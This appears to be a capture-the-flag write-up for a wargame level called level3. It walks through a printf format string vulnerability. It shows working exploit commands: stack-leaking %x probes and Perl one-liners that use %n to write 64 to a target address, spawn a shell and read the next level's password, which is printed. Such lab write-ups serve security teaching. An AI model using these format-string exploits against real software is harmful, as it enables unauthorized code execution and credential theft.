# level3

We have a program named level3
```bash
> ./level3
text  <- user input
text  <- program output
```

If we disass the program, we see a function `v`.

In this function, there is a fgets call, then a printf of the fgets

After the printf, we have a condition
```c
;  address of a constant in the data section
if ds:0x804988c == 64 {
	system("/bin/sh")
}
```

We will use a vulnerability of printf with the `%n` option
> https://www.exploit-db.com/papers/23985.

The goal is to write the value `64` in the address `0x804988c`.

---

By specifying printf args that have not been sent, it will still look for them in the stack
```bash
> echo "AAAAA %x %x %x %x" | ~/level3
AAAAA 200 b7fd1ac0 b7ff37d0 41414141
```

We can also do this
```bash
> echo "%x %x" | ~/level3
200 b7fd1ac0
> echo "%1\$x" | ~/level3
200
> echo "%2\$x" | ~/level3
b7fd1ac0
```

Let's determine the offset at which the first printf arg begin
```bash
> for i in {0..100}; do echo "Index: $i" && echo "****%$i\$x" | ./level3 ; done | grep -B1 2a2a
Index: 4
****2a2a2a2a
```
This mean that we can do
```bash
> echo "ABCDAA %4\$x" | ./level3
ABCDAA 44434241

# 41 A,  42 B,  43 C,  44 D

# ABCDAA 44 43 42 41
#        D  C  B  A
```

---

The `%n` option

```c
printf("AAAAAA%n", addr)
// addr = 0x6;  // because of the 6 'A' before %n
```
> "%n: the number of characters already written is stored in the integer indicated by the pointer argument of type int *. No arguments are converted."

So if we write the address of the variable that we want to change the value (4 char) + 60 random char and the `%n` option, the value `64` will be writed in the address.

---

Let's try this:

```bash
> perl -e 'print "\x8c\x98\x04\x08" . "A"x60 . "%4\$n"' > /tmp/args
> cat /tmp/args - | ./level3
...
Wait what?!
# this is the /bin/sh
> cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

Alternative:

```bash
> (perl -e 'print "\x8c\x98\x04\x08" . "A"x(64-4) . "%4\$n"'; cat) | ./level3

�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```